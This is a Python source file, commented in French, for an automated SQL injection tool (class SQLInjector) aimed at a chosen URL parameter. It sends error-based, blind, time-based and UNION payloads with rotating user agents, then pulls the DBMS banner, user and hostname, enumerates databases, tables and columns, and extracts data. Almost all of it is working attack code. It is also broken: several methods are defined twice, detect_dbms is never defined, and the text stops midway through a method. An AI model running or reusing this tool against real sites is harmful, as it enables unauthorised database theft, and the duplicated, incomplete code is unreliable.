# function.py

import os
import re
import requests
from bs4 import BeautifulSoup
import urllib.parse as urlparse
import logging
import json
from concurrent.futures import ThreadPoolExecutor, as_completed
from rich.console import Console
from rich.table import Table
from rich.progress import track
import random
import datetime
from urllib3.exceptions import InsecureRequestWarning

# Suppression des avertissements liés aux certificats SSL
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# Configuration des logs
logging.basicConfig(
    level=logging.DEBUG,  # Niveau de log défini à DEBUG pour plus de détails
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[logging.StreamHandler()]
)
logger = logging.getLogger("SQLInjector")

# Initialisation de la console Rich pour un affichage élégant
console = Console()

# Charger les payloads depuis un fichier JSON situé dans le même répertoire que le script
script_dir = os.path.dirname(os.path.realpath(__file__))
payloads_path = os.path.join(script_dir, 'payloads.json')

# Ajouter des logs de débogage
logger.debug(f"Script directory: {script_dir}")
logger.debug(f"Looking for payloads.json at: {payloads_path}")

try:
    with open(payloads_path, 'r', encoding='utf-8') as f:
        PAYLOADS = json.load(f)
    logger.info(f"Payloads chargés avec succès. Types de tests disponibles : {', '.join(PAYLOADS.keys())}")
except FileNotFoundError:
    logger.error(f"Le fichier payloads.json est introuvable dans le répertoire {script_dir}. Assurez-vous qu'il est présent.")
    PAYLOADS = {}
except json.JSONDecodeError as e:
    logger.error(f"Erreur de décodage JSON dans payloads.json: {e}")
    PAYLOADS = {}

# Définir les indicateurs d'erreur dans les réponses
ERROR_INDICATORS = [
    "you have an error in your sql syntax;",
    "warning: mysql",
    "unclosed quotation mark after the character string",
    "quoted string not properly terminated",
    "pg_query(): ERROR:",
    "ORA-",
    "invalid query",
    "SQL syntax",
    "Syntax error",
    "mysqli_",
    "Warning:",
    "Fatal error:"
]

class SQLInjector:
    def __init__(self, url, param, method='GET', threads=10, timeout=10, proxies=None, user_agents=None, output=None, selected_tests=None, post_data=None, db=None, tbl=None):
        """
        Initialise l'instance SQLInjector.

        :param url: URL cible à scanner.
        :param param: Paramètre vulnérable à tester.
        :param method: Méthode HTTP à utiliser ('GET' ou 'POST').
        :param threads: Nombre de threads pour le multithreading.
        :param timeout: Timeout pour les requêtes HTTP.
        :param proxies: Proxies à utiliser pour les requêtes.
        :param user_agents: Liste de User-Agents pour la rotation.
        :param output: Fichier de sortie pour sauvegarder les résultats.
        :param selected_tests: Liste des types de tests à exécuter.
        :param post_data: Données pour les requêtes POST.
        :param db: Nom de la base de données à cibler.
        :param tbl: Nom de la table à cibler.
        """
        self.url = url
        self.param = param
        self.method = method.upper()
        self.threads = threads
        self.timeout = timeout
        self.proxies = proxies
        self.user_agents = user_agents or [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
            "Mozilla/5.0 (X11; Linux x86_64)"
        ]
        self.output = output
        self.session = requests.Session()
        self.session.verify = False  # Ignorer les avertissements SSL
        self.results = []
        self.vuln_found = False
        self.selected_tests = selected_tests or [
            "basic", "blind", "timebase", "gbkquotes", "allalpha", "union",
            "banner", "current_user", "current_database", "hostname",
            "dbs_count", "dbs_names", "tbls_count", "tbls_names", "cols_count", "cols_names"
        ]
        self.post_data = post_data
        self.db = db
        self.tbl = tbl

    def random_user_agent(self):
        """Sélectionne un User-Agent aléatoire de la liste fournie."""
        return random.choice(self.user_agents)

    def get_headers(self):
        """Génère les en-têtes HTTP pour les requêtes."""
        return {
            "User-Agent": self.random_user_agent(),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Connection": "close"
        }

    def send_request(self, payload, data=None):
        """
        Envoie une requête HTTP avec le payload injecté.

        :param payload: Payload d'injection SQL.
        :param data: Données pour les requêtes POST.
        :return: Contenu de la réponse ou chaîne vide en cas d'échec.
        """
        try:
            parsed = urlparse.urlparse(self.url)
            query = urlparse.parse_qs(parsed.query)
            if self.param:
                query[self.param] = payload
            new_query = urlparse.urlencode(query, doseq=True)
            injected_url = urlparse.urlunparse((
                parsed.scheme,
                parsed.netloc,
                parsed.path,
                parsed.params,
                new_query,
                parsed.fragment
            ))
            logger.debug(f"Injecting payload: {payload} into URL: {injected_url}")

            if self.method == 'GET':
                response = self.session.get(
                    injected_url,
                    headers=self.get_headers(),
                    proxies=self.proxies,
                    timeout=self.timeout
                )
            elif self.method == 'POST':
                # Merge les données POST existantes avec le payload injecté
                post_data = self.post_data.copy() if self.post_data else {}
                if self.param:
                    post_data[self.param] = payload
                response = self.session.post(
                    injected_url,
                    data=post_data,
                    headers=self.get_headers(),
                    proxies=self.proxies,
                    timeout=self.timeout
                )
            else:
                logger.error(f"Méthode HTTP non supportée: {self.method}")
                return ""

            logger.debug(f"Received response with status code: {response.status_code}")
            if response.status_code == 200:
                return response.text
            else:
                logger.warning(f"Non-200 status code received: {response.status_code}")
                return ""
        except requests.RequestException as e:
            logger.error(f"Request failed for payload {payload}: {e}")
            return ""

    def test_payload(self, payload, test_type=None):
        """
        Teste un payload spécifique pour détecter une vulnérabilité SQL.

        :param payload: Payload d'injection SQL.
        :param test_type: Type de test (pour une classification des résultats).
        """
        response = self.send_request(payload)
        timestamp = datetime.datetime.utcnow().isoformat() + "Z"
        if response:
            if any(error in response.lower() for error in ERROR_INDICATORS):
                logger.info(f"[VULNERABLE] Payload: {payload}")
                status = "VULNERABLE"
                if test_type:
                    status += f" ({test_type})"
                self.results.append({
                    "timestamp": timestamp,
                    "payload": payload,
                    "url": self.url,
                    "param": self.param,
                    "status": status
                })
                self.vuln_found = True
            else:
                logger.debug(f"No vulnerability detected with payload: {payload}")
        else:
            logger.debug(f"No response for payload: {payload}")

    def run_basic_tests(self):
        """Exécute les tests d'injection SQL basiques."""
        console.rule("[bold red]Running Basic SQL Injection Tests[/bold red]")
        basic_payloads = PAYLOADS.get("basic", [])
        if not basic_payloads:
            logger.warning("Aucun payload 'basic' trouvé dans payloads.json.")
            return

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(self.test_payload, payload, test_type="basic"): payload for payload in basic_payloads}
            for future in track(as_completed(futures), total=len(futures), description="Running Basic Tests"):
                pass

    def run_blind_tests(self):
        """Exécute les tests d'injection SQL aveugles."""
        console.rule("[bold red]Running Blind SQL Injection Tests[/bold red]")
        blind_payloads = PAYLOADS.get("blind", [])
        if not blind_payloads:
            logger.warning("Aucun payload 'blind' trouvé dans payloads.json.")
            return

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            for pair in blind_payloads:
                if isinstance(pair, list) and len(pair) == 2:
                    payload_true, payload_false = pair
                    executor.submit(self.test_payload, payload_true, test_type="blind_true")
                    executor.submit(self.test_payload, payload_false, test_type="blind_false")
        # Les résultats seront collectés dans test_payload

    def run_timebase_tests(self):
        """Exécute les tests d'injection SQL basés sur le temps."""
        console.rule("[bold red]Running Time-Based SQL Injection Tests[/bold red]")
        timebase_payloads = PAYLOADS.get("timebase", [])
        if not timebase_payloads:
            logger.warning("Aucun payload 'timebase' trouvé dans payloads.json.")
            return

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(self.test_payload, payload, test_type="timebase"): payload for payload in timebase_payloads}
            for future in track(as_completed(futures), total=len(futures), description="Running Time-Based Tests"):
                pass

    def run_gbkquotes_tests(self):
        """Exécute les tests d'injection SQL avec des guillemets GBK."""
        console.rule("[bold red]Running GBK Quotes SQL Injection Tests[/bold red]")
        gbkquotes_payloads = PAYLOADS.get("gbkquotes", [])
        if not gbkquotes_payloads:
            logger.warning("Aucun payload 'gbkquotes' trouvé dans payloads.json.")
            return

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(self.test_payload, payload, test_type="gbkquotes"): payload for payload in gbkquotes_payloads}
            for future in track(as_completed(futures), total=len(futures), description="Running GBK Quotes Tests"):
                pass

    def run_allalpha_tests(self):
        """Exécute les tests d'injection SQL avec des caractères alphabétiques."""
        console.rule("[bold red]Running All Alpha SQL Injection Tests[/bold red]")
        allalpha_payloads = PAYLOADS.get("allalpha", [])
        if not allalpha_payloads:
            logger.warning("Aucun payload 'allalpha' trouvé dans payloads.json.")
            return

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(self.test_payload, payload, test_type="allalpha"): payload for payload in allalpha_payloads}
            for future in track(as_completed(futures), total=len(futures), description="Running All Alpha Tests"):
                pass

    def run_union_tests(self):
        """Exécute les tests d'injection SQL basés sur UNION."""
        console.rule("[bold red]Running UNION-Based SQL Injection Tests[/bold red]")
        union_payloads = PAYLOADS.get("union", [])
        if not union_payloads:
            logger.warning("Aucun payload 'union' trouvé dans payloads.json.")
            return

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(self.test_payload, payload, test_type="union"): payload for payload in union_payloads}
            for future in track(as_completed(futures), total=len(futures), description="Running UNION Tests"):
                pass

    def retrieve_dbms_banner(self):
        """Récupère la bannière du DBMS."""
        console.rule("[bold red]Retrieving DBMS Banner[/bold red]")
        banner_payloads = PAYLOADS.get("banner", {})
        if not banner_payloads:
            logger.warning("Aucun payload 'banner' trouvé dans payloads.json.")
            return

        dbms = self.detect_dbms()
        if not dbms:
            logger.warning("Impossible de détecter le SGBD. Le test de bannière peut échouer.")
            return

        for payload in banner_payloads.get(dbms, []):
            complete_payload = f"' UNION SELECT {payload}-- "
            response = self.send_request(complete_payload)
            timestamp = datetime.datetime.utcnow().isoformat() + "Z"
            if response:
                # Extraction simple de la bannière
                banner_pattern = re.compile(r"([\w\s\.\-]+)", re.IGNORECASE)
                match = banner_pattern.search(response)
                if match:
                    banner = match.group(1).strip()
                    status = f"[Banner] {dbms} DBMS Banner Retrieved: {banner}"
                    logger.info(status)
                    self.results.append({
                        "timestamp": timestamp,
                        "payload": complete_payload,
                        "url": self.url,
                        "param": self.param,
                        "status": status
                    })
                    break
        else:
            logger.warning(f"Aucune bannière DBMS récupérée avec les payloads disponibles pour {dbms}.")

    def get_current_user(self):
        """Récupère l'utilisateur actuel du DBMS."""
        console.rule("[bold red]Retrieving Current DBMS User[/bold red]")
        current_user_payloads = PAYLOADS.get("current_user", {})
        if not current_user_payloads:
            logger.warning("Aucun payload 'current_user' trouvé dans payloads.json.")
            return

        dbms = self.detect_dbms()
        if not dbms:
            logger.warning("Impossible de détecter le SGBD. La récupération de l'utilisateur peut échouer.")
            return

        for payload in current_user_payloads.get(dbms, []):
            complete_payload = f"' UNION SELECT {payload}-- "
            response = self.send_request(complete_payload)
            timestamp = datetime.datetime.utcnow().isoformat() + "Z"
            if response:
                # Extraction simple de l'utilisateur
                user_pattern = re.compile(r"([\w]+)", re.IGNORECASE)
                match = user_pattern.search(response)
                if match:
                    user = match.group(1)
                    status = f"[Current User] {dbms} Current User Retrieved: {user}"
                    logger.info(status)
                    self.results.append({
                        "timestamp": timestamp,
                        "payload": complete_payload,
                        "url": self.url,
                        "param": self.param,
                        "status": status
                    })
                    break
        else:
            logger.warning(f"Aucun utilisateur récupéré avec les payloads disponibles pour {dbms}.")

    def get_current_database(self):
        """Récupère la base de données actuelle du DBMS."""
        console.rule("[bold red]Retrieving Current Database[/bold red]")
        current_db_payloads = PAYLOADS.get("current_database", {})
        if not current_db_payloads:
            logger.warning("Aucun payload 'current_database' trouvé dans payloads.json.")
            return

        dbms = self.detect_dbms()
        if not dbms:
            logger.warning("Impossible de détecter le SGBD. La récupération de la base de données peut échouer.")
            return

        for payload in current_db_payloads.get(dbms, []):
            complete_payload = f"' UNION SELECT {payload}-- "
            response = self.send_request(complete_payload)
            timestamp = datetime.datetime.utcnow().isoformat() + "Z"
            if response:
                # Extraction simple de la base de données
                db_pattern = re.compile(r"([\w]+)", re.IGNORECASE)
                match = db_pattern.search(response)
                if match:
                    current_db = match.group(1)
                    status = f"[Current Database] {dbms} Current Database Retrieved: {current_db}"
                    logger.info(status)
                    self.results.append({
                        "timestamp": timestamp,
                        "payload": complete_payload,
                        "url": self.url,
                        "param": self.param,
                        "status": status
                    })
                    break
        else:
            logger.warning(f"Aucune base de données récupérée avec les payloads disponibles pour {dbms}.")

    def get_hostname(self):
        """Récupère le nom d'hôte du serveur DBMS."""
        console.rule("[bold red]Retrieving DBMS Hostname[/bold red]")
        hostname_payloads = PAYLOADS.get("hostname", {})
        if not hostname_payloads:
            logger.warning("Aucun payload 'hostname' trouvé dans payloads.json.")
            return

        dbms = self.detect_dbms()
        if not dbms:
            logger.warning("Impossible de détecter le SGBD. La récupération du hostname peut échouer.")
            return

        for payload in hostname_payloads.get(dbms, []):
            complete_payload = f"' UNION SELECT {payload}-- "
            response = self.send_request(complete_payload)
            timestamp = datetime.datetime.utcnow().isoformat() + "Z"
            if response:
                # Extraction simple du hostname
                hostname_pattern = re.compile(r"([\w\.-]+)", re.IGNORECASE)
                match = hostname_pattern.search(response)
                if match:
                    hostname = match.group(1)
                    status = f"[Hostname] {dbms} Hostname Retrieved: {hostname}"
                    logger.info(status)
                    self.results.append({
                        "timestamp": timestamp,
                        "payload": complete_payload,
                        "url": self.url,
                        "param": self.param,
                        "status": status
                    })
                    break
        else:
            logger.warning(f"Aucun hostname récupéré avec les payloads disponibles pour {dbms}.")

    def get_dbs_count(self):
        """Récupère le nombre de bases de données disponibles."""
        console.rule("[bold red]Retrieving Databases Count[/bold red]")
        dbs_count_payloads = PAYLOADS.get("dbs_count", {})
        if not dbs_count_payloads:
            logger.warning("Aucun payload 'dbs_count' trouvé dans payloads.json.")
            return

        dbms = self.detect_dbms()
        if not dbms:
            logger.warning("Impossible de détecter le SGBD. La récupération des comptes de bases de données peut échouer.")
            return

        for payload in dbs_count_payloads.get(dbms, []):
            # Formater le payload avec 'db'
            formatted_payload = payload.format(db=self.db) if self.db else payload
            complete_payload = f"' UNION SELECT {formatted_payload}-- "
            response = self.send_request(complete_payload)
            timestamp = datetime.datetime.utcnow().isoformat() + "Z"
            if response:
                # Utilisation d'une expression régulière pour capturer le compte
                count_pattern = re.compile(r"(\d+)", re.IGNORECASE)
                match = count_pattern.search(response)
                if match:
                    count = match.group(1)
                    status = f"[DBs Count] {dbms} Databases Count Retrieved: {count}"
                    logger.info(status)
                    self.results.append({
                        "timestamp": timestamp,
                        "payload": formatted_payload,
                        "url": self.url,
                        "param": self.param,
                        "status": status
                    })
                    break
        else:
            logger.warning(f"Aucun compte de bases de données récupéré avec les payloads disponibles pour {dbms}.")

    def get_dbs_names(self):
        """Récupère les noms des bases de données disponibles."""
        console.rule("[bold red]Retrieving Databases Names[/bold red]")
        dbs_names_payloads = PAYLOADS.get("dbs_names", {})
        if not dbs_names_payloads:
            logger.warning("Aucun payload 'dbs_names' trouvé dans payloads.json.")
            return

        dbms = self.detect_dbms()
        if not dbms:
            logger.warning("Impossible de détecter le SGBD. L'énumération des bases de données peut échouer.")
            return

        dbs_names = []
        for payload in dbs_names_payloads.get(dbms, []):
            # Formater le payload avec 'db'
            formatted_payload = payload.format(db='information_schema')
            complete_payload = f"' UNION SELECT {formatted_payload}-- "
            response = self.send_request(complete_payload)
            timestamp = datetime.datetime.utcnow().isoformat() + "Z"
            if response:
                # Extraction simple des bases de données
                databases = re.findall(r"([\w]+)", response)
                if databases:
                    unique_databases = list(set(databases))
                    logger.info(f"Databases Found: {', '.join(unique_databases)}")
                    self.results.append({
                        "timestamp": timestamp,
                        "payload": formatted_payload,
                        "url": self.url,
                        "param": self.param,
                        "status": f"Databases: {', '.join(unique_databases)}"
                    })
                    dbs_names.extend(unique_databases)
                    break
                else:
                    logger.debug("No databases found with the given payload.")
            else:
                logger.warning(f"Aucune réponse pour le payload de noms de bases de données pour {dbms}.")

        # Filtrer les bases de données uniques
        dbs_names = list(set(dbs_names))
        # Pour chaque base de données trouvée, énumérer les tables
        for db in dbs_names:
            self.enumerate_tables(db)

    def get_tbls_count(self, db):
        """Récupère le nombre de tables disponibles dans une base de données."""
        console.rule(f"[bold red]Retrieving Tables Count in Database: {db}[/bold red]")
        tbls_count_payloads = PAYLOADS.get("tbls_count", {}).get(db, [])
        if not tbls_count_payloads:
            logger.warning(f"Aucun payload 'tbls_count' trouvé pour la base de données {db} dans payloads.json.")
            return

        for payload in tbls_count_payloads:
            # Formater le payload avec 'db' et 'tbl'
            formatted_payload = payload.format(db=db, tbl=self.tbl) if self.tbl else payload.format(db=db)
            complete_payload = f"' UNION SELECT {formatted_payload}-- "
            response = self.send_request(complete_payload)
            timestamp = datetime.datetime.utcnow().isoformat() + "Z"
            if response:
                # Utilisation d'une expression régulière pour capturer le compte
                count_pattern = re.compile(r"(\d+)", re.IGNORECASE)
                match = count_pattern.search(response)
                if match:
                    count = match.group(1)
                    status = f"[Tables Count] {db} Tables Count Retrieved: {count}"
                    logger.info(status)
                    self.results.append({
                        "timestamp": timestamp,
                        "payload": formatted_payload,
                        "url": self.url,
                        "param": self.param,
                        "status": status
                    })
                    break
        else:
            logger.warning(f"Aucun compte de tables récupéré avec les payloads disponibles pour {db}.")

    def get_tbls_names(self, db, tbl):
        """Récupère les noms des tables disponibles dans une base de données."""
        console.rule(f"[bold red]Retrieving Tables Names in Database: {db}[/bold red]")
        tbls_names_payloads = PAYLOADS.get("tbls_names", {}).get(db, [])
        if not tbls_names_payloads:
            logger.warning(f"Aucun payload 'tbls_names' trouvé pour la base de données {db} dans payloads.json.")
            return

        tables = []
        for payload in tbls_names_payloads:
            # Formater le payload avec 'db' et 'tbl'
            formatted_payload = payload.format(db=db, tbl=tbl)
            complete_payload = f"' UNION SELECT {formatted_payload}-- "
            response = self.send_request(complete_payload)
            timestamp = datetime.datetime.utcnow().isoformat() + "Z"
            if response:
                # Extraction simple des noms des tables
                tbl_found = re.findall(r"([\w]+)", response)
                if tbl_found:
                    unique_tables = list(set(tbl_found))
                    logger.info(f"Tables in {db}: {', '.join(unique_tables)}")
                    self.results.append({
                        "timestamp": timestamp,
                        "payload": formatted_payload,
                        "url": self.url,
                        "param": self.param,
                        "status": f"Tables in {db}: {', '.join(unique_tables)}"
                    })
                    tables.extend(unique_tables)
                    break
        else:
            logger.warning(f"Aucune table récupérée avec les payloads disponibles pour {db}.")

        # Pour chaque table trouvée, énumérer les colonnes
        for tbl in tables:
            self.enumerate_columns(db, tbl)

    def get_cols_count(self, db, tbl):
        """Récupère le nombre de colonnes disponibles dans une table."""
        console.rule(f"[bold red]Retrieving Columns Count in Table: {tbl} (Database: {db})[/bold red]")
        cols_count_payloads = PAYLOADS.get("cols_count", {}).get(db, [])
        if not cols_count_payloads:
            logger.warning(f"Aucun payload 'cols_count' trouvé pour la base de données {db} et la table {tbl} dans payloads.json.")
            return

        for payload in cols_count_payloads:
            # Formater le payload avec 'db' et 'tbl'
            formatted_payload = payload.format(db=db, tbl=tbl)
            complete_payload = f"' UNION SELECT {formatted_payload}-- "
            response = self.send_request(complete_payload)
            timestamp = datetime.datetime.utcnow().isoformat() + "Z"
            if response:
                # Utilisation d'une expression régulière pour capturer le compte
                count_pattern = re.compile(r"(\d+)", re.IGNORECASE)
                match = count_pattern.search(response)
                if match:
                    count = match.group(1)
                    status = f"[Columns Count] {tbl} Columns Count Retrieved: {count}"
                    logger.info(status)
                    self.results.append({
                        "timestamp": timestamp,
                        "payload": formatted_payload,
                        "url": self.url,
                        "param": self.param,
                        "status": status
                    })
                    break
        else:
            logger.warning(f"Aucun compte de colonnes récupéré avec les payloads disponibles pour {tbl} dans {db}.")

    def get_cols_names(self, db, tbl):
        """Récupère les noms des colonnes disponibles dans une table."""
        console.rule(f"[bold red]Retrieving Columns Names in Table: {tbl} (Database: {db})[/bold red]")
        cols_names_payloads = PAYLOADS.get("cols_names", {}).get(db, [])
        if not cols_names_payloads:
            logger.warning(f"Aucun payload 'cols_names' trouvé pour la base de données {db} et la table {tbl} dans payloads.json.")
            return

        columns = []
        for payload in cols_names_payloads:
            # Formater le payload avec 'db' et 'tbl'
            formatted_payload = payload.format(db=db, tbl=tbl)
            complete_payload = f"' UNION SELECT {formatted_payload}-- "
            response = self.send_request(complete_payload)
            timestamp = datetime.datetime.utcnow().isoformat() + "Z"
            if response:
                # Extraction simple des noms des colonnes
                col_found = re.findall(r"([\w]+)", response)
                if col_found:
                    unique_columns = list(set(col_found))
                    logger.info(f"Columns in {tbl}: {', '.join(unique_columns)}")
                    self.results.append({
                        "timestamp": timestamp,
                        "payload": formatted_payload,
                        "url": self.url,
                        "param": self.param,
                        "status": f"Columns in {tbl}: {', '.join(unique_columns)}"
                    })
                    columns.extend(unique_columns)
                    break
        else:
            logger.warning(f"Aucune colonne récupérée avec les payloads disponibles pour {tbl} dans {db}.")

        # Pour chaque colonne trouvée, extraire les données
        for column in columns:
            self.extract_data(db, tbl, column)

    def extract_data(self, db, tbl, column):
        """Extrait des données spécifiques d'une colonne dans une table."""
        console.rule(f"[bold red]Extracting Data from {column} in Table: {tbl} (Database: {db})[/bold red]")
        extract_payloads = [
            f"'{column}'",
            f"CONCAT({column})",
            f"GROUP_CONCAT({column})"
        ]
        for payload in extract_payloads:
            complete_payload = f"' UNION SELECT {payload} FROM {db}.{tbl}-- "
            response = self.send_request(complete_payload)
            timestamp = datetime.datetime.utcnow().isoformat() + "Z"
            if response:
                # Extraction simple des données
                data = re.findall(rf"{column}\s*[:=]\s*'([^']+)'", response, re.IGNORECASE)
                if data:
                    unique_data = list(set(data))
                    logger.info(f"Data in {column}: {', '.join(unique_data)}")
                    self.results.append({
                        "timestamp": timestamp,
                        "payload": complete_payload,
                        "url": self.url,
                        "param": self.param,
                        "status": f"Data in {column}: {', '.join(unique_data)}"
                    })
                    break
                else:
                    # Tentative d'extraction alternative
                    data = re.findall(rf"{column}\s*[:=]\s*([^'\";]+)", response, re.IGNORECASE)
                    if data:
                        unique_data = list(set(data))
                        logger.info(f"Data in {column}: {', '.join(unique_data)}")
                        self.results.append({
                            "timestamp": timestamp,
                            "payload": complete_payload,
                            "url": self.url,
                            "param": self.param,
                            "status": f"Data in {column}: {', '.join(unique_data)}"
                        })
                        break
                    else:
                        logger.info(f"No data found in column {column} with the given payload.")
            else:
                logger.error("No response received for data extraction payload.")

    def enumerate_databases(self):
        """Énumère les bases de données disponibles."""
        console.rule("[bold red]Enumerating Databases[/bold red]")
        dbs_names_payloads = PAYLOADS.get("dbs_names", {})
        if not dbs_names_payloads:
            logger.warning("Aucun payload 'dbs_names' trouvé dans payloads.json.")
            return

        # Détecter le SGBD pour utiliser les payloads appropriés
        dbms = self.detect_dbms()
        if not dbms:
            logger.warning("Impossible de détecter le SGBD. L'énumération des bases de données peut échouer.")
            return

        dbs_names = []
        for payload in dbs_names_payloads.get(dbms, []):
            # Formater le payload avec 'db'
            formatted_payload = payload.format(db='information_schema')
            complete_payload = f"' UNION SELECT {formatted_payload}-- "
            response = self.send_request(complete_payload)
            timestamp = datetime.datetime.utcnow().isoformat() + "Z"
            if response:
                # Extraction simple des bases de données
                databases = re.findall(r"([\w]+)", response)
                if databases:
                    unique_databases = list(set(databases))
                    logger.info(f"Databases Found: {', '.join(unique_databases)}")
                    self.results.append({
                        "timestamp": timestamp,
                        "payload": formatted_payload,
                        "url": self.url,
                        "param": self.param,
                        "status": f"Databases: {', '.join(unique_databases)}"
                    })
                    dbs_names.extend(unique_databases)
                    break
                else:
                    logger.debug("No databases found with the given payload.")
            else:
                logger.warning(f"Aucune réponse pour le payload de noms de bases de données pour {dbms}.")

        # Filtrer les bases de données uniques
        dbs_names = list(set(dbs_names))
        # Pour chaque base de données trouvée, énumérer les tables
        for db in dbs_names:
            self.enumerate_tables(db)

    def enumerate_tables(self, database):
        """Énumère les tables d'une base de données spécifiée."""
        console.rule(f"[bold red]Enumerating Tables in Database: {database}[/bold red]")
        tbls_names_payloads = PAYLOADS.get("tbls_names", {})
        if not tbls_names_payloads:
            logger.warning("Aucun payload 'tbls_names' trouvé dans payloads.json.")
            return

        # Détecter le SGBD
        dbms = self.detect_dbms()
        if not dbms:
            logger.warning("Impossible de détecter le SGBD. L'énumération des tables peut échouer.")
            return

        tables = []
        for payload in tbls_names_payloads.get(dbms, []):
            # Formater le payload avec 'db' et 'tbl'
            formatted_payload = payload.format(db=database, tbl='dummy_table')
            complete_payload = f"' UNION SELECT {formatted_payload}-- "
            response = self.send_request(complete_payload)
            timestamp = datetime.datetime.utcnow().isoformat() + "Z"
            if response:
                # Extraction simple des tables
                tbl_found = re.findall(r"([\w]+)", response)
                if tbl_found:
                    unique_tables = list(set(tbl_found))
                    logger.info(f"Tables in {database}: {', '.join(unique_tables)}")
                    self.results.append({
                        "timestamp": timestamp,
                        "payload": formatted_payload,
                        "url": self.url,
                        "param": self.param,
                        "status": f"Tables in {database}: {', '.join(unique_tables)}"
                    })
                    tables.extend(unique_tables)
                    break
                else:
                    logger.debug(f"No tables found in database {database} with the given payload.")
            else:
                logger.warning(f"Aucune réponse pour le payload de noms de tables pour {database}.")

        # Filtrer les tables uniques
        tables = list(set(tables))
        # Pour chaque table trouvée, énumérer les colonnes
        for tbl in tables:
            self.enumerate_columns(database, tbl)

    def enumerate_columns(self, database, table):
        """Énumère les colonnes d'une table spécifiée dans une base de données."""
        console.rule(f"[bold red]Enumerating Columns in Table: {table} (Database: {database})[/bold red]")
        cols_names_payloads = PAYLOADS.get("cols_names", {})
        if not cols_names_payloads:
            logger.warning("Aucun payload 'cols_names' trouvé dans payloads.json.")
            return

        # Détecter le SGBD
        dbms = self.detect_dbms()
        if not dbms:
            logger.warning("Impossible de détecter le SGBD. L'énumération des colonnes peut échouer.")
            return

        columns = []
        for payload in cols_names_payloads.get(dbms, []):
            # Formater le payload avec 'db' et 'tbl'
            formatted_payload = payload.format(db=database, tbl=table)
            complete_payload = f"' UNION SELECT {formatted_payload}-- "
            response = self.send_request(complete_payload)
            timestamp = datetime.datetime.utcnow().isoformat() + "Z"
            if response:
                # Extraction simple des colonnes
                col_found = re.findall(r"([\w]+)", response)
                if col_found:
                    unique_columns = list(set(col_found))
                    logger.info(f"Columns in {table}: {', '.join(unique_columns)}")
                    self.results.append({
                        "timestamp": timestamp,
                        "payload": formatted_payload,
                        "url": self.url,
                        "param": self.param,
                        "status": f"Columns in {table}: {', '.join(unique_columns)}"
                    })
                    columns.extend(unique_columns)
                    break
                else:
                    logger.debug(f"No columns found in table {table} with the given payload.")
            else:
                logger.warning(f"Aucune réponse pour le payload de noms de colonnes pour {table} dans {database}.")

        # Filtrer les colonnes uniques
        columns = list(set(columns))
        # Pour chaque colonne trouvée, extraire les données
        for column in columns:
            self.extract_data(database, table, column)

    def extract_data(self, db, tbl, column):
        """Extrait des données spécifiques d'une colonne dans une table."""
        console.rule(f"[bold red]Extracting Data from {column} in Table: {tbl} (Database: {db})[/bold red]")
        extract_payloads = [
            f"'{column}'",
            f"CONCAT({column})",
            f"GROUP_CONCAT({column})"
        ]
        for payload in extract_payloads:
            complete_payload = f"' UNION SELECT {payload} FROM {db}.{tbl}-- "
            response = self.send_request(complete_payload)
            timestamp = datetime.datetime.utcnow().isoformat() + "Z"
            if response:
                # Extraction simple des données
                data = re.findall(rf"{column}\s*[:=]\s*'([^']+)'", response, re.IGNORECASE)
                if data:
                    unique_data = list(set(data))
                    logger.info(f"Data in {column}: {', '.join(unique_data)}")
                    self.results.append({
                        "timestamp": timestamp,
                        "payload": complete_payload,
                        "url": self.url,
                        "param": self.param,
                        "status": f"Data in {column}: {', '.join(unique_data)}"
                    })
                    break
                else:
                    # Tentative d'extraction alternative
                    data = re.findall(rf"{column}\s*[:=]\s*([^'\";]+)", response, re.IGNORECASE)
                    if data:
                        unique_data = list(set(data))
                        logger.info(f"Data in {column}: {', '.join(unique_data)}")
                        self.results.append({
                            "timestamp": timestamp,
                            "payload": complete_payload,
                            "url": self.url,
                            "param": self.param,
                            "status": f"Data in {column}: {', '.join(unique_data)}"
                        })
                        break
                    else:
                        logger.info(f"No data found in column {column} with the given payload.")
            else:
                logger.error("No response received for data extraction payload.")

    def enumerate_databases(self):
        """Énumère les bases de données disponibles."""
        console.rule("[bold red]Enumerating Databases[/bold red]")
        dbs_names_payloads = PAYLOADS.get("dbs_names", {})
        if not dbs_names_payloads:
            logger.warning("Aucun payload 'dbs_names' trouvé dans payloads.json.")
            return

        # Détecter le SGBD pour utiliser les payloads appropriés
        dbms = self.detect_dbms()
        if not dbms:
            logger.warning("Impossible de détecter le SGBD. L'énumération des bases de données peut échouer.")
            return

        dbs_names = []
        for payload in dbs_names_payloads.get(dbms, []):
            # Formater le payload avec 'db'
            formatted_payload = payload.format(db='information_schema')
            complete_payload = f"' UNION SELECT {formatted_payload}-- "
            response = self.send_request(complete_payload)
            timestamp = datetime.datetime.utcnow().isoformat() + "Z"
            if response:
                # Extraction simple des bases de données
                databases = re.findall(r"([\w]+)", response)
                if databases:
                    unique_databases = list(set(databases))
                    logger.info(f"Databases Found: {', '.join(unique_databases)}")
                    self.results.append({
                        "timestamp": timestamp,
                        "payload": formatted_payload,
                        "url": self.url,
                        "param": self.param,
                        "status": f"Databases: {', '.join(unique_databases)}"
                    })
                    dbs_names.extend(unique_databases)
                    break
                else:
                    logger.debug("No databases found with the given payload.")
            else:
                logger.warning(f"Aucune réponse pour le payload de noms de bases de données pour {dbms}.")

        # Filtrer les bases de données uniques
        dbs_names = list(set(dbs_names))
        # Pour chaque base de données trouvée, énumérer les tables
        for db in dbs_names:
            self.enumerate_tables(db)

    def enumerate_tables(self, database):
        """Énumère les tables d'une base de données spécifiée."""
        console.rule(f"[bold red]Enumerating Tables in Database: {database}[/bold red]")
        tbls_names_payloads = PAYLOADS.get("tbls_names", {})
        if not tbls_names_payloads:
            logger.warning("Aucun payload 'tbls_names' trouvé dans payloads.json.")
            return

        # Détecter le SGBD
        dbms = self.detect_dbms()
        if not dbms:
            logger.warning("Impossible de détecter le SGBD. L'énumération des tables peut échouer.")
            return

